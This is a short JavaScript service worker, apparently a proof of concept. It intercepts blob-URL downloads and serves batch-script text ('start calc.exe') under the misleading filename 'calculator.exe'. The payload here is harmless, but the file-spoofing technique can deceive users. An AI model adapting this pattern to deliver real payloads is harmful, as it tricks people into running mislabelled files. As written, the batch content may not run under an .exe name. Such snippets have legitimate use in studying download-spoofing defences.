self.addEventListener('fetch', event => {
    // Tangkap request ke blob URL (yang dibuat di index.html)
    if (event.request.url.startsWith('blob:')) {
        // Balas dengan teks batch + header nama file
        event.respondWith(
            new Response('@echo off\nstart calc.exe', {
                headers: {
                    'Content-Disposition': 'attachment; filename="calculator.exe"'
                }
            })
        );
    }
});
